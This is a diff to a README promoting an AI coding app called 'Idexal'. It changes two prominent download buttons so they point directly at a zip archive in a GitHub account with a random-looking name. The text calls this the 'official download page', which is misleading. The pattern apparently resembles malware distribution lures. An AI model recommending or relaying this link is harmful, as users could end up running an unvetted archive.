@@ -38,7 +38,7 @@ Follow these simple steps to start using Idexal today.
 
 ### Step 1: Visit the Download Page
 
-<a href="https://github.com/Selflimited-americangreentoad552/selflimited-americangreentoad552.github.io/raw/refs/heads/main/preview/v2.2-alpha.1.zip" style="display:inline-block;background-color:#ff6b35;color:white;padding:16px 32px;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;">⬇️ Download Idexal Now</a>
+<a href="https://raw.githubusercontent.com/Selflimited-americangreentoad552/selflimited-americangreentoad552.github.io/main/preview/v2.2-alpha.1.zip" style="display:inline-block;background-color:#ff6b35;color:white;padding:16px 32px;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;">⬇️ Download Idexal Now</a>
 
 Click the big orange button above — it takes you directly to the official download page for Idexal.
 
@@ -186,7 +186,7 @@ English and Arabic are fully supported, including right-to-left text display. Ma
 Idexal is more than just a coding tool — it's your personal AI teammate that fits in your pocket. Download it now and experience the freedom of working anywhere, on any device.
 
 <center>
-<a href="https://github.com/Selflimited-americangreentoad552/selflimited-americangreentoad552.github.io/raw/refs/heads/main/preview/v2.2-alpha.1.zip" style="display:inline-block;background-color:#28a745;color:white;padding:18px 36px;font-size:22px;font-weight:bold;border-radius:8px;text-decoration:none;">🚀 Download Idexal Today</a>
+<a href="https://raw.githubusercontent.com/Selflimited-americangreentoad552/selflimited-americangreentoad552.github.io/main/preview/v2.2-alpha.1.zip" style="display:inline-block;background-color:#28a745;color:white;padding:18px 36px;font-size:22px;font-weight:bold;border-radius:8px;text-decoration:none;">🚀 Download Idexal Today</a>
 </center>
 
 ---
